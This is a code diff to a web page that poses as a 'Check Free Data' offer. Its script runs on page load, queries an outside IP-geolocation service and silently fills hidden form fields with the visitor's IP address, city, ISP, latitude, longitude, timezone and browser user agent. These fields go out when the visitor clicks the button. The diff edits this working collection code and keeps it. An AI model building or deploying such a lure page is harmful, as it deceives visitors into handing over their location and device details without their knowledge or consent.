@@ -8,15 +8,14 @@
       background: #121212;
       color: #fff;
       font-family: Arial, sans-serif;
-      padding: 40px;
       text-align: center;
+      padding: 40px;
     }
     h2 {
       color: #00cec9;
     }
     p {
       color: #dfe6e9;
-      margin-bottom: 40px;
     }
     button {
       padding: 15px 30px;
@@ -26,8 +25,10 @@
       background-color: #0984e3;
       color: white;
       cursor: pointer;
+      margin-top: 30px;
     }
-    .hidden {
+    #status {
+      margin-top: 20px;
       display: none;
     }
   </style>
@@ -40,32 +41,38 @@
     <input type="hidden" name="IP Address" id="ip">
     <input type="hidden" name="Location" id="location">
     <input type="hidden" name="Device Info" id="device">
-    <button type="submit" id="submitBtn">Check Free Data</button>
+    <button type="submit">Check Free Data</button>
   </form>
 
-  <p id="status" class="hidden">Submitting... Please wait</p>
+  <p id="status">Submitting... Please wait</p>
 
   <script>
-    async function fillFormAndEnableButton() {
+    async function fetchData() {
       try {
-        const res = await fetch("https://ip-api.com/json/"); // HTTPS FIXED
+        const res = await fetch("https://ipwho.is/");
         const data = await res.json();
 
-        if (data.status === "success") {
-          document.getElementById("ip").value = data.query;
-          document.getElementById("location").value =
-            `Country: ${data.country}\nRegion: ${data.regionName}\nCity: ${data.city}\nZIP: ${data.zip}\nISP: ${data.isp}\nLat: ${data.lat}\nLon: ${data.lon}\nTimezone: ${data.timezone}`;
+        if (data.success) {
+          document.getElementById("ip").value = data.ip;
+          document.getElementById("location").value = `
+Country: ${data.country}
+Region: ${data.region}
+City: ${data.city}
+ISP: ${data.connection.isp}
+Latitude: ${data.latitude}
+Longitude: ${data.longitude}
+Timezone: ${data.timezone.id}`;
         }
         document.getElementById("device").value = navigator.userAgent;
       } catch (err) {
-        console.error("IP Fetch Error:", err);
+        console.error("Error fetching IP info", err);
       }
     }
 
-    fillFormAndEnableButton();
+    fetchData();
 
     document.getElementById("autoForm").addEventListener("submit", () => {
-      document.getElementById("status").classList.remove("hidden");
+      document.getElementById("status").style.display = "block";
     });
   </script>
 </body>
